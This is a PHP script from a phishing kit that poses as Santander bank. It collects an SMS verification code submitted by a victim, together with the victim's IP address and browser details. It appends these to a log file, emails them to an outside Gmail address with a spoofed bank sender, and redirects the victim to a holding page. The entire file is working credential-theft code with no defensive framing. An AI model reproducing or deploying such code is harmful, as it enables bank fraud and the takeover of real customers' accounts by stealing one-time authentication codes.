<?php

include("../HOSTER.php"); 
include("blocker.php");
include("detect.php");


$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 
//include("../SHkIllUA.php"); 

$msg="|+ validEni-1(SANTANDERBANk)\r\n";
$msg.="==================================================\r\n";
$msg.="[+] Sms 1 : {$_POST['SMS']}\r\n";
$msg.="==============================\r\n";
$msg.="[+] localIP : {$_SERVER['REMOTE_ADDR']}\r\n";
$msg.="[+] BROWSER : {$_SESSION['browser']} On/ {$_SESSION['os']}\r\n";
$msg.="\r\n";
$msg.="\r\n";
$save=fopen("../groupe.txt","a+");fwrite($save,$msg);fclose($save);
$email="cocco.clement15@gmail.com"; //HERE
$subject="validéni-1(SANTANDERBANk) =?utf-8?Q?=F0=9F=94=A5?= ({$_SERVER['REMOTE_ADDR']})";
$headers="From: EIkCHI™<SANTANDERBANk@moneySquad.org>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($email,$subject,$msg,$headers);


header("Location: ../../Espera_1.php");

?>